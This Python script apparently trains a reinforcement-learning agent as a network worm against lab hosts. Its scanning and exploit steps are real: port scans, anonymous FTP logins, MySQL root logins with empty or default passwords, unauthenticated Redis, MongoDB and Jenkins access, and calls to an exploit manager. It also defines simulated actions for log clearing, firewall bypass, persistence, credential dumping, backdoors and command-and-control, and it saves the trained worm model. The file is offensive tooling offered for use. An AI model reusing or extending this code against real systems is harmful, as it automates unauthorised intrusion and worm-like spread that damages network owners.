#!/usr/bin/env python3
"""
FULL REAL WORM TRAINING - All modules integrated
Scanner + Exploits (Real) + Evasion + Post-Exploit + C2
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from config import Config
except ImportError:
    from configs.config import Config

import numpy as np
import random
import socket
import time
import json
import requests
from ftplib import FTP
import pymysql
import redis
from pymongo import MongoClient
from rl_engine import PropagationAgent
from exploits.exploit_manager import ExploitManager

class FullRealWormTrainer:
    """Complete worm with ALL modules using REAL exploitation"""
    
    # All 30 actions
    ACTIONS = [
        # Scanner (5)
        'scan_port', 'scan_service', 'os_detect', 'vuln_scan', 'enum_users',
        # Exploits (10) - REAL
        'exploit_http', 'exploit_ftp', 'exploit_ssh', 'exploit_smb', 'exploit_mysql',
        'exploit_postgres', 'exploit_redis', 'exploit_jenkins', 'exploit_mongodb', 'exploit_telnet',
        # Evasion (5)
        'enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs', 'encrypt_traffic',
        # Post-Exploit (5)
        'persistence', 'priv_esc', 'lateral_move', 'dump_creds', 'install_backdoor',
        # C2 (5)
        'setup_http_c2', 'setup_dns_c2', 'beacon', 'execute_cmd', 'upload_payload',
    ]
    
    def __init__(self):
        self.state_size = 50
        self.action_size = 30
        self.agent = PropagationAgent(self.state_size, self.action_size, use_dqn=True)
        
        # Real exploit manager
        self.exploit_manager = ExploitManager(Config())
        
        # Labs - REAL targets
        self.labs = [
            {'ip': '192.168.200.10', 'port': 80, 'name': 'HTTP', 'service': 'http'},
            {'ip': '192.168.200.11', 'port': 21, 'name': 'FTP', 'service': 'ftp'},
            {'ip': '192.168.200.12', 'port': 22, 'name': 'SSH', 'service': 'ssh'},
            {'ip': '192.168.200.13', 'port': 3306, 'name': 'MySQL', 'service': 'mysql'},
            {'ip': '192.168.200.18', 'port': 8080, 'name': 'Jenkins', 'service': 'jenkins'},
            {'ip': '192.168.200.19', 'port': 27017, 'name': 'MongoDB', 'service': 'mongodb'},
        ]
        
        # State
        self.infected = []
        self.persisted = []
        self.lateral = []
        self.c2_sessions = []
        self.creds_dumped = []
        
        # Metrics
        self.metrics = {
            'scans': 0, 'exploits': 0, 'exploit_success': 0,
            'evasion': 0, 'evasion_success': 0,
            'persistence': 0, 'lateral': 0, 'creds_dump': 0, 'c2': 0,
            'real_success': 0, 'real_fail': 0,
        }
        
        # Training - slower decay
        self.agent.epsilon = 1.0
        self.agent.epsilon_min = 0.001
        self.agent.epsilon_decay = 0.997
        
        self.best_reward = float('-inf')
        self.history = {'rewards': [], 'infections': [], 'real_success': []}
    
    def check_port(self, ip, port, timeout=2):
        """Check if port is open"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            r = s.connect_ex((ip, port))
            s.close()
            return r == 0
        except:
            return False
    
    def scan_target(self, ip):
        """Real network scan"""
        ports = []
        for p in [21, 22, 80, 443, 3306, 5432, 6379, 8080, 27017]:
            if self.check_port(ip, p):
                ports.append(p)
        if ports:
            self.metrics['scans'] += 1
        return ports
    
    def do_exploit(self, lab):
        """REAL exploitation on target"""
        ip = lab['ip']
        port = lab['port']
        service = lab['service']
        
        # Check if port is open
        if not self.check_port(ip, port):
            return False
        
        success = False
        
        try:
            if service == 'http':
                # Try web exploit
                target = {'ip': ip, 'open_ports': [port], 'services': {}}
                result = self.exploit_manager.exploit_target(target)
                success = result[0]
                
            elif service == 'ftp':
                # Try FTP anonymous
                ftp = FTP(ip, timeout=3)
                try:
                    ftp.login()
                    ftp.quit()
                    success = True
                except:
                    try:
                        ftp.login('anonymous', 'anon@')
                        ftp.quit()
                        success = True
                    except:
                        pass
                        
            elif service == 'mysql':
                # Try MySQL
                try:
                    conn = pymysql.connect(host=ip, user='root', password='', connect_timeout=3)
                    conn.close()
                    success = True
                except:
                    try:
                        conn = pymysql.connect(host=ip, user='root', password='mysql123', connect_timeout=3)
                        conn.close()
                        success = True
                    except:
                        pass
                        
            elif service == 'redis':
                # Try Redis
                r = redis.Redis(host=ip, port=6379, socket_timeout=3)
                r.ping()
                success = True
                
            elif service == 'jenkins':
                # Try Jenkins
                r = requests.get(f'http://{ip}:8080/api/json', timeout=3)
                success = r.status_code == 200
                
            elif service == 'mongodb':
                # Try MongoDB
                client = MongoClient(host=ip, port=27017, serverSelectionTimeoutMS=3000)
                client.server_info()
                success = True
                
        except Exception as e:
            pass
        
        return success
    
    def execute_action(self, action, lab, infected):
        """Execute any action - real or simulated"""
        # Scanner actions
        if action in ['scan_port', 'scan_service', 'os_detect', 'vuln_scan', 'enum_users']:
            ports = self.scan_target(lab['ip'])
            return True, 10, len(ports) > 0
        
        # Exploit actions - REAL
        if action.startswith('exploit_'):
            self.metrics['exploits'] += 1
            success = self.do_exploit(lab)
            if success:
                self.metrics['exploit_success'] += 1
                self.metrics['real_success'] += 1
                return True, 200, True
            else:
                self.metrics['real_fail'] += 1
                return False, -15, False
        
        # Evasion actions
        if action in ['enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs', 'encrypt_traffic']:
            self.metrics['evasion'] += 1
            if random.random() > 0.3:
                self.metrics['evasion_success'] += 1
                return True, 20, infected
            return False, -5, infected
        
        # Post-exploit actions
        if action in ['persistence', 'priv_esc', 'lateral_move', 'dump_creds', 'install_backdoor']:
            if infected and random.random() > 0.3:
                if action == 'persistence':
                    self.metrics['persistence'] += 1
                    if lab['ip'] not in self.persisted:
                        self.persisted.append(lab['ip'])
                elif action == 'lateral_move':
                    self.metrics['lateral'] += 1
                elif action == 'dump_creds':
                    self.metrics['creds_dump'] += 1
                    self.creds_dumped.append(lab['ip'])
                return True, 50, True
            return False, -5, infected
        
        # C2 actions
        if action in ['setup_http_c2', 'setup_dns_c2', 'beacon', 'execute_cmd', 'upload_payload']:
            if infected and random.random() > 0.3:
                self.metrics['c2'] += 1
                if lab['ip'] not in self.c2_sessions:
                    self.c2_sessions.append(lab['ip'])
                return True, 60, True
            return False, -5, infected
        
        return True, 1, infected
    
    def create_state(self, lab, open_ports, episode):
        """Create state vector"""
        state = np.zeros(self.state_size)
        
        # Ports (0-9)
        port_map = {21: 0, 22: 1, 80: 2, 443: 3, 3306: 4, 5432: 5, 6379: 6, 8080: 7, 27017: 8}
        for p in open_ports:
            if p in port_map:
                state[port_map[p]] = 1.0
        
        # Infection state (10-15)
        state[10] = len(self.infected) / 5.0
        state[11] = len(self.persisted) / 3.0
        state[12] = len(self.lateral) / 3.0
        state[13] = len(self.c2_sessions) / 3.0
        state[14] = len(self.creds_dumped) / 3.0
        
        # Metrics (15-20)
        state[15] = self.metrics['exploit_success'] / max(1, self.metrics['exploits'])
        
        # Episode info (21-25)
        state[21] = episode / 100.0
        state[22] = self.agent.epsilon
        
        return state.tolist()
    
    def train(self, episodes=500):
        """Train on all labs"""
        print("="*60)
        print("  FULL REAL WORM TRAINING")
        print("  Scanner + Exploits + Evasion + Post-Exploit + C2")
        print("="*60)
        
        # Check available labs
        available = []
        print("\nAvailable Labs:")
        for lab in self.labs:
            ports = self.scan_target(lab['ip'])
            if ports:
                available.append(lab)
                print(f"  ✓ {lab['name']} ({lab['ip']}:{lab['port']})")
        
        if not available:
            print("ERROR: No labs available!")
            return
        
        eps_per_lab = episodes // len(available)
        
        for round_num in range(10):
            round_infections = 0
            
            print(f"\n{'='*60}")
            print(f"  ROUND {round_num + 1}/10 | ε={self.agent.epsilon:.4f}")
            print(f"{'='*60}")
            
            for lab in available:
                print(f"\n  Target: {lab['name']} ({lab['ip']})")
                
                for ep in range(eps_per_lab):
                    # Scan
                    open_ports = self.scan_target(lab['ip'])
                    if not open_ports:
                        continue
                    
                    # State
                    state = self.create_state(lab, open_ports, ep)
                    episode_reward = 0
                    infected = False
                    
                    # Action loop
                    for step in range(12):
                        action_idx = self.agent.act(state, list(range(len(self.ACTIONS))))
                        action = self.ACTIONS[action_idx]
                        
                        success, reward, now_infected = self.execute_action(action, lab, infected)
                        
                        if action.startswith('exploit_') and success and not infected:
                            infected = True
                            if lab['ip'] not in self.infected:
                                self.infected.append(lab['ip'])
                                round_infections += 1
                        
                        episode_reward += reward
                        
                        # Memory
                        next_state = self.create_state(lab, open_ports, ep + 1)
                        done = step >= 11
                        self.agent.remember(state, action_idx, reward, next_state, done)
                        
                        if len(self.agent.memory) >= 32:
                            self.agent.replay(batch_size=32)
                        
                        state = next_state
                        
                        # Continue after infection for post-exploit
                        if infected:
                            # Try a few more steps for post-exploit
                            if step > 5:
                                break
                    
                    # Decay
                    if self.agent.epsilon > self.agent.epsilon_min:
                        self.agent.epsilon *= self.agent.epsilon_decay
                    
                    # History
                    self.history['rewards'].append(episode_reward)
                    self.history['infections'].append(len(self.infected))
                    self.history['real_success'].append(self.metrics['real_success'])
                    
                    if ep % 10 == 0:
                        print(f"    Ep {ep}: R={episode_reward:.0f} Inf={infected}")
                
                print(f"  → {lab['name']}: {len([i for i in self.infected if i == lab['ip']])} infections")
            
            print(f"\n  Round {round_num + 1}: {round_infections} infections, "
                  f"Real: {self.metrics['real_success']} succ/{self.metrics['real_fail']} fail")
        
        # Final
        print("\n" + "="*60)
        print("  TRAINING COMPLETE")
        print("="*60)
        print(f"  Episodes: {len(self.history['rewards'])}")
        print(f"  Infections: {len(self.infected)}")
        print(f"  Real Exploits: {self.metrics['real_success']} success / {self.metrics['real_fail']} fail")
        print(f"  Persistence: {self.metrics['persistence']}")
        print(f"  Lateral: {self.metrics['lateral']}")
        print(f"  C2: {self.metrics['c2']}")
        
        # Save
        os.makedirs("models", exist_ok=True)
        self.agent.save("models/full_real_worm.pt")
        print(f"\n  ✅ Model: models/full_real_worm.pt")
        
        with open("training_history_full_real.json", "w") as f:
            json.dump({
                'history': self.history,
                'metrics': self.metrics,
                'infected': self.infected,
            }, f, indent=2)
        print(f"  ✅ History: training_history_full_real.json")


if __name__ == "__main__":
    # Create trainer
    trainer = FullRealWormTrainer()
    
    # Train
    trainer.train(episodes=600)